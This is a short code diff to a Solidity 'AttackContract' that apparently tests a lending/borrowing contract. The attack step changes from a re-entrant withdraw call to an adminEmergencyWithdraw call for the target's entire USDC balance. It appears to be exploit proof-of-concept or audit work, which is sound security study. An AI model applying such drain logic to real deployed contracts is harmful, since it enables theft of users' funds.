@@ -23,9 +23,13 @@ contract AttackContract {
         lendingBorrowing.deposit(amount);
 
         // Run the attack to exploit re-entrency in withdraw function
-        lendingBorrowing.withdraw(amount);
+        // lendingBorrowing.withdraw(amount);
 
-        uint256 balance = s_usdc.balanceOf(address(lendingBorrowing));
+        lendingBorrowing.adminEmergencyWithdraw(
+            s_usdc.balanceOf(address(lendingBorrowing))
+        );
+
+        //uint256 balance = s_usdc.balanceOf(address(lendingBorrowing));
         //console.log("balance: %s", balance);
     }
 
